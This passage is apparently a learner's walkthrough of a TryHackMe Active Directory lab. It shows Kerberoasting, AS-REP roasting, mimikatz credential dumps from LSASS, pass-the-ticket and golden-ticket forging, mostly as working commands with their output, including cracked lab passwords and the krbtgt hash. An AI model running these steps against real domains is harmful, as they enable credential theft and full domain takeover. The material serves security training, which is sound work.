+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /home/sypher/thm-rooms/attacking-kerberos/Active-Directory-Wordlists/Pass.txt
+* Passwords.: 1240
+* Bytes.....: 9706
+* Keyspace..: 1240
+* Runtime...: 0 secs
+
+$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$7b0d84f66734386d66b26519498ebf42$2faea7d145cb14e5c010febf78c890ebf55b3846ed09c8052d78eda50f97c8c5f7ad4410573e94674dadc53303c664cb9d4f981831ad740eca31bc7cac9ca477fce608d7b512a3be934cd2638a35e49a4e4a77848889477f4a0a111bfa0bd3ca39366b77558b1de31979535ff6b0fd0655d8bda9c7504e531e83587ac6344819b8770bbb28399de87405705a9c2934767b2156b2fc43d18e123773630207ed52a83e9aa6b8a582a7037cc6c12c40855d4bcf55c68bc515fed0754c80ae75b8d01b75be47f3e11875b3047ee16aee668ced09093c797ac3b1aeb15ea2d2e9246abb909e098be32cabef46dc6ab31339126b652ef6cc9a3c8b9b6178a69b30bbeff46bf5ba55a03f1652b31c29c1cbbf1f765a2768fd71bbebf502f447f332a2753ec4db33f1210d9fc617bbb03b6febf2249475f42b83746adeae4d6e1a3a6397d74111de4b46ff2b0f58058f36bdbb8f5fc6d464c7aae5756274246abace74645abc484ccf5c87ed6f04e470058d4e42b95a41627236a00949cae193879f5eee643758640d856f874f32c15af6e14f96cf7ca802167de535f11f9874e12ba8382b9c0897cd228dac6201686a15a0b68720d3e382530ea7c29183fd6a3fc8882186a04b0dfaa5758e1a45e5f73f521f057074e0c68cd32a29622e06b4a5f28b03db7660bcf591aa5d602dbb053fae973e8de1106b28aebd829a4348bd82c0dc114b966398ac7223df80152e0ec75e9cfc5df31e548e863c5c1db4fbfd89ed6e5ef9be127fbd19dd67e7655a05c637c7896df6e0e92d71d76d43e6469fcd2bbf47d295f2b96f94b40f36656531b9ff26cdb35ae843a182d5f5c7f6af9a988721ed80f3846972183919f4d1ebcbe7f14c75f19c9881420a20031defa0cc216ec99e1c4fa1c8ed280467e047ee8010b7d5ee06bb4ef6dee9d2c2e316ff48e77f2b1bb89df82177be6f02b83e054a18cd8863a7169116ab82bacf477ce680f2ce0bf1e47d1ace9ecc26ef851154612b4d7cd4aeca6545b94115843d4db1a58a3c4b90af59d23d76e1e70e1ad007f919b4cafbba0f3e91afbb0d9d1cb455131d00110f1fc2697d39e6de9e2d6bc36a7b2a5e7ef0614b774b3f9355e9b6557bc5eb84b0364fa0e6c6753ea5890cf4e0062543afda99a48ef85dae3e5740f86dc809f9c9e2aec05fb7f94600ca089c64b2124adad828954a22fe4122f894a7cc3c3933a1d59056623b06300ae8e5ee391d7c64cdee1d962847026f809294be13ba9983cd79ecb1487d82f508724975b1e2fc461af8aba8b4bfd6529260c8869f8cf04b04c308a7cf7366763d40ede303875cd0e63b49a70065356e6ed039dccbfbf66fbc813119f1372d322df7cdb9a9b7457b54d41ada6170dadfb5977923b094101cfb11169afedfd84e33809eb95bfef5a39ef77fd10e10b0c11bfbfe9b0f5ae426feeb52835f764fb27af7a8a4efa1ee922e9d3ec869e8addce6ef3a78ed613faac7cea38984cd527968f05eddeec15cc4e1aba98c1fc57bb855e4d6c230d1c1fe9c219d8de2db5a5804fe7d741aacd8289fbb5c1cef9f153ae1c32f68cd5fe8643cbb438e727875c353cb421aed70d0f8c61745902f46db40ee8f351a3de2247fddbc2180bffd30672f9ced52f257ae4ad0:Summer2020
+
+---------------
+
+we have the password for HTTPService and it is (Summer2020)
+
+---------------
+
+┌──(sypher㉿kali)-[~/thm-rooms/attacking-kerberos/hashes]
+└─$ hashcat -m 13100 -a 0 sqlservice-hash.txt ~/thm-rooms/attacking-kerberos/Active-Directory-Wordlists/Pass.txt 
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-cortex-a72, 1438/2940 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /home/sypher/thm-rooms/attacking-kerberos/Active-Directory-Wordlists/Pass.txt
+* Passwords.: 1240
+* Bytes.....: 9706
+* Keyspace..: 1240
+
+Approaching final keyspace - workload adjusted.           
+
+$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$1771a8cff6db5b767414e0b50245215a$cc6eca887f4fe5066082cef93ed777a7615cf8eaea53cc5560e261d330797057959f36f52175654dfef78222d691f88f36dbe8e2e0ca2d93f3e12c9b9570721bc94673dfafc876da600177e116a90488e91dc7505ae1f3bd8770089bdc6bd3cf3930cbd796b4ee39d19822480b432da6d3120e8f65612916240b98386eafd6b23d8de48ad6dd6a5662be8c62ff1dd0f4fafaae126dd16f3f03bf63b6dbea8df7177cb513c36dd0d67cfe7f453733c752fdcbb3b38384424e67e651c93bb0a9fa10c2cafab22ae2507eed7732a672c40d9c3715a21680cbb2cb853d0150cc00f1404740905c0056d0f2216d8e3837319fa1dc3cd664fb61b1245f82a3109810238d64da51a552f0ed652269663e2b1acb4fa8e02d7930d399a8e043d4d3eca60f21ac16b54468d81f3a2ec4e00d5f2f1cc8892d941d9954f0dec89400ce4397b7755e4e79f4a09efd87cb9f2203fa55b67c88f48444d89ee69d4f0dab89017a479cc449a73f89f6ed1748a4ad2f72a11f19cdd36b6aa6e48b6452088d616287fcb3a47e4c2f7659f33e58ce40cf35e9d5c5e29262b283213c0130fa39b9d37af4e81469c766353939d525426f85b1e1abc9d7effecb70c22b7aa70d86e147f9c557162e055bb059678cffccfceabef70d6f2a950d9fdbab85720c2c456e764dffb77e5653e5b5db71748ef164751cf998c0fa355c73bb6054a0c2190c758278b0e8c0911ca53d2d21827735ff8d2448023af17b7ca0f2113cfd33da946b80a368a69c888a7ae6849fc1a2649afd8da57fd4245d04ba8b556630fb99da4c0ca215a037fc824251cc887bd63b73119ff56b6e0d65b8aff5e37198a4b4c374828e4331023c2353107b8296954a70fb4b2e5d51143e2b001da46b6a3c606f0257688e3450b008f93e388188068582b3448fea779e53f281084ceaa2aeadf170cab9bf39efe61841231aa2fe3b3da10a197da0c1a623f7be4ababc86e45b923211d054c0670fcea49b9414ac4bb99382fd7e8dc231c99eb8f21744bf114418fc435e84df1af7089724b2d5584c7a0c041948445afe870cc102d4745e4cf7fe0d305dfca1bb24b3e7cdba3ada2b9b14d674d1d7b07b3564562cd859757d35c5ec08a331235473fc2e7a2219c48a43f73fa7ca5556bf87e329b90d021bd45c488da4ee68d1982d2d7198c58788a9053bed50d863e22e4bee409797044a27369a96c2165c83d09607d53a2b39434836a543a8953e7e2172cb95de6447b33f9398c3156a3832641e217c35a58703a50e809a48643ccbbc05ab07c85afeb41be8f256ef78d67c07e0155eab80634112ab4407060e7df991ecb8562174ea57414d167e4da983741ef64f919f4de82a7b7ad266deb7f4eae6d7bada685f288340fb88b1178f8b3662cc3ea3ba716c73be688430b35d7607e34e94f0f6ac38385bf9e0a1b550b336e7b0d57b62d15d8c46fbd6e2381e2885a14111b54924735f6b14f91bfe88f55495d28cf81a809889140842e5a65db3795aa0a0aee284e5e0ed9ccfe86e9fc112642549a81c6327b5c259558d5f6fff5601c3159ca25e69bc69c6a17a57b7aaa1392a66dd89f2fbd8371eb8772bbf6e936654be25e0cef4d71b6b1763f7d97b9ca4e3699a285de2c3e3e9d13115a4a6:MYPassword123#
+
+
+-------------------
+and we have the password for "sqlservice" which is "MYPassword123#"
+
+------------------
+
+
+now we are gonna use impacket
+
+gotta say using impacket is better because the hashes that it gives can be used and doesn't have spaces.
+got the same results  
+
+-----------------------------------------
+
+now that we have two service accounts, we can check whether they are domain admins or not.
+*)If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. 
+*)If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.
+----------------------------------------
+------------------
+3)AS-REP ROASTING
+------------------
+#TASK=5
+
+
+we'll still use rubeus as it is very simple to use, and it will give us a krbasrep5 hash
+we will try and dump the hashes for the accounts that have pre-authentication disabled, and then use hashcat to crack the hashes 
+
+*)There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.
+
+METHOD 1 using rubeus on the target machine
+---------------------------------------------------
+PS C:\Users\Administrator\Downloads> .\Rubeus.exe asreproast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : CONTROLLER.local
+
+[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
+[*] SamAccountName         : Admin2
+[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::5cbd:22d8:c8d3:31c1%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$Admin2@CONTROLLER.local:CE38ACE04EC1EAB66F432DB2A589436E$4A4D9FCA6E4B
+      1AD3623E529D49AA0DC0D0DDB5C2D533D2DC42D28BC3E091A3609323017F19B8E488B15A4D0EA7D3
+      1C139DF4DECB5724EE7D8770F0E4EA015708B3B857CC6B3F032275CFDDEBD7820FB6DE8EE239EDD2
+      88078F235A696F081143E650D4BE299964B67328A76942ACEF420EB58AF17FA29BE6A75D12B757B0
+      0F20939FBC1C2B78FA35BE1FC8BA9E8E883A89D6F466F4573418838645481F94E31CAFAF6A11B03B
+      CAE6A4AA6B728008EB5E3E232862A61AD7D50040D524E0EC8FDF5CEEAF6B48B42111AE33F7B07959
+      D495DBAAADA3387CD3F6B49CC4B0F87140D87D5FEB3E36CD23AFAD2867F037FC57681B3901BC
+
+[*] SamAccountName         : User3
+[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::5cbd:22d8:c8d3:31c1%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$User3@CONTROLLER.local:7E21D41585B20CA08E5E3991BB06F170$1CD0BA5FEF2C5
+      63926BEB8152FB21DCA273A39281CC70534861F36EBBF7DC4B03F1DC553DA5EF19882601E9DBB3DB
+      8B820E62837488739376F7D5D72059A85640506D90DB6558A35F4D5DB0F50A4AE430AAC0310685E2
+      A43DF7F5223CBFE7AFA746F49EE064F17299FA563BFE7516D63C81CB4EFC6670E100A72EB2FF9A2E
+      9963384D9F058666B5057912EF9B8655DE28049A4866784729C1436DC3C92531ED1977AAACFF9B5F
+      ED292CD135C5F5B090D4406C6126B6169FC3E2F8AECAC202260111D9C2A1DA76F8B8F97C9479E300
+      9F2F229CADF5809584912FD839AE0A699DC30EBF218FE2AA05D09664109CBD86114A281D0A1
+
+-------------------------------------------------------
+the benefit of using rubeus over impacket's getnpuser.py is that rubeus does not require a user and just dumps the krbasrep5 hash for found user but impacket requires a username.
+-------------------------------------------------------
+METHOD 2 using impacket's GetNPUsers.py
+
+┌──(sypher㉿kali)-[/usr/share/doc/python3-impacket/examples]
+└─$ ./GetNPUsers.py controller.local/Admin2 -no-pass    
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for Admin2
+$krb5asrep$23$Admin2@CONTROLLER.LOCAL:e506fd688f97f52ab67572c5a77bea08$c3aab14a8edee94a31e2d57acfa273af117fdb929d67f6e597c891a4679fce9ca2e05c938091e36aa7f98989cc6e480544251f82af2db659d3e3748a56eba177381d819a93af7be3fdbcd8910e7456d789b6e0ebf9fed31450dcd0541b8515d324a493ed7354aae34495d5840a026fcf2e5195d8b7b00ef3703823120ede4071b3714374bffd6a5aefccc5cce1ce56c51ed78eb9f4bdf485f8842216606aabbc4335bf95e051fdabff5de581329aa0c9a5c462c47c16c4835a0f73106707e3600a76f8c0b2ade9d2ca4ed8bcfb02963de11b547080565ec7ef9755919a672446011a5ef48f53a2f1b3587559a74f6f4351ae7686
+                                                                                                                                                                                  
+┌──(sypher㉿kali)-[/usr/share/doc/python3-impacket/examples]
+└─$ ./GetNPUsers.py controller.local/User3 -no-pass
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for User3
+$krb5asrep$23$User3@CONTROLLER.LOCAL:5b68b9beccb9da6cbc63c80c9adcbe21$5e33e7ce35e522c843f3540203e4516ff8d150829a7268aa1af3bc0b2bc4cc5fec0d800ac3fa86a161c7993e7d5c1536fdd3f8b5f814aa2e28423cae23979f734ca0f0c93aae622ca5ea4a5bb9b72978775e7574967cd50278caa1aa734e365b77064c0fa17352bc708420b8f3e47383122004126d62961f325a7550440083a17f0cb892e7046e11a5576d149cf2522367cf32eacdec2caaf6ecedd1fd111572696d41d7ed3b496911b3872f26c1f0b3a221cb5211770963c6e7dcd42404cd0465e3b9dde746ae4bede49cc53e3434ebc7816e2a774b0008833c1ce40a826bd9c9f6054c8f0af2629cd51bf344d9f6356229586d
+-------------------------------------------------------
+
+
+now we can use hashcat to crack these krbasrep5 hashes for Admin2 and User3.
+
+┌──(sypher㉿kali)-[~/thm-rooms/attacking-kerberos/hashes]
+└─$ hashcat -m 18200 -a 0 Admin2-krbasrep5-hash.txt  ~/thm-rooms/attacking-kerberos/Active-Directory-Wordlists/Pass.txt
+
+Password for Admin2 =P@$$W0rd2
+Password for User3  =Password3
+
+------------------------------------------------------
+#TASK= 6 
+PASS THE TICKET WITH MIMIKATZ
+------------------------------------------------------
+
+mimikatz is a very popular and powerful post-exploitation tool, most commonly used to dump user credentials inside of an active directory network, however well be using mimikatz in order to dump a TGT from LSASS memory
+
+to use mimikatz, we need to have an elevated privilege cmd or powershell otherwise mimikatz will not work.
+
+to check if you have the right privileges run;
+mimikatz.exe
+mimikatz # privilege::debug     // if it gives you a [20] ok, then you have the right access.
+
+then we can type the following to dump the hashes from the lsass
+mimikatz # sekurlsa::tickets /export    //will dump the hashes in the current directory that you're in.
+
+we can use the following to impersonate as the user that kerberos ticket belongs to and perform a 'pass the ticket' attack 
+mimikatz # kerberos::ptt <ticket>   //and it should give us a : OK
+
+we can check if we successfully impersonated the user we wanted to by exiting mimikatz and typing 'klist', we should get this;
+
+PS C:\Windows\System32> klist
+
+Current LogonId is 0:0x2e122e
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ CONTROLLER.LOCAL
+        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/1/2022 9:49:06 (local)
+        End Time:   3/1/2022 19:49:06 (local)
+        Renew Time: 3/8/2022 9:49:06 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+----------------------------------------------------------
+
+to verify and list the admin share we can type 
+
+PS C:\Windows\System32> dir \\<domain-ip>\<user>$
+PS C:\Windows\System32> dir \\10.10.91.35\admin$
+----------------------------------------------------------
+#TASK = 7
+GOLDEN/SILVER tickets attacks
+------------------------------
+
+we'll be using mimikatz in order to create a silver ticket.
+A silver can sometimes be better than a golden ticket, because it is a little more discrete than a golden ticket.
+If stealth and staying undetected matters then using a silver ticket is a better option. 
+However the process of creating one is identical for both.
+
+
+Golden/Silver ticket attack overview:
+A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
+
+***Dumping the krbtgt hash using mimikatz***
+first you have to ssh or rdp to one of the user accounts to run mimikatz.
+
+> in the cmd or powershell
+run mimikatz.exe
+mimikatz # privilege::debug    //you must get a {20 ok} to continue.
+then by typing this;
+mimikatz # lsadump::lsa /inject /name:krbtgt    //This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+we get the following
+--------------------------
+mimikatz # lsadump::lsa /inject /name:krbtgt 
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
+
+RID  : 000001f6 (502)
+User : krbtgt
+                                                               
+ * Primary       
+    NTLM : 72cd714611b64cd4d5550cd2759db3f6
+    LM   : 
+  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6 
+    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6 
+    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6 
+ 
+ * WDigest                   
+    01  d2e9aa3caa4509c3f11521c70539e4ad      
+    02  c9a868fc195308b03d72daa4a5a4ee47      
+    03  171e066e448391c934d0681986f09ff4      
+    04  d2e9aa3caa4509c3f11521c70539e4ad      
+    05  c9a868fc195308b03d72daa4a5a4ee47      
+    06  41903264777c4392345816b7ecbf0885      
+    07  d2e9aa3caa4509c3f11521c70539e4ad      
+    08  9a01474aa116953e6db452bb5cd7dc49      
+    09  a8e9a6a41c9a6bf658094206b51a4ead      
+    10  8720ff9de506f647ad30f6967b8fe61e 
+    11  841061e45fdc428e3f10f69ec46a9c6d 
+    12  a8e9a6a41c9a6bf658094206b51a4ead 
+    13  89d0db1c4f5d63ef4bacca5369f79a55 
+    14  841061e45fdc428e3f10f69ec46a9c6d 
+    15  a02ffdef87fc2a3969554c3f5465042a 
+    16  4ce3ef8eb619a101919eee6cc0f22060 
+    17  a7c3387ac2f0d6c6a37ee34aecf8e47e 
+    18  085f371533fc3860fdbf0c44148ae730 
+    19  265525114c2c3581340ddb00e018683b 
+    20  f5708f35889eee51a5fa0fb4ef337a9b 
+    21  bffaf3c4eba18fd4c845965b64fca8e2 
+    22  bffaf3c4eba18fd4c845965b64fca8e2 
+    23  3c10f0ae74f162c4b81bf2a463a344aa  
+    24  96141c5119871bfb2a29c7ea7f0facef  
+    25  f9e06fa832311bd00a07323980819074  
+    26  99d1dd6629056af22d1aea639398825b  
+    27  919f61b2c84eb1ff8d49ddc7871ab9e0  
+    28  d5c266414ac9496e0e66ddcac2cbcc3b  
+    29  aae5e850f950ef83a371abda478e05db  
+
+ * Kerberos
+    Default Salt : CONTROLLER.LOCALkrbtgt 
+    Credentials
+      des_cbc_md5       : 79bf07137a8a6b8f
+
+ * Kerberos-Newer-Keys
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033 
+      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
+      des_cbc_md5       (4096) : 79bf07137a8a6b8f
+
+ * NTLM-Strong-NTOWF
+    Random Value : 4b9102d709aada4d56a27b6c3cd14223
+-----------------------------------------------
+
+***Create a Golden/Silver Ticket*** 
+
+mimikatz #  Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: 
+>EXAMPLE = mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 
+> This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+
+we get 
+------------
+mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 
+User      : Administrator
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt       
+Lifetime  : 3/2/2022 9:08:39 AM ; 2/28/2032 9:08:39 AM ; 2/28/2032 9:08:39 AM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+------------
+
+
+
+
+
+
+
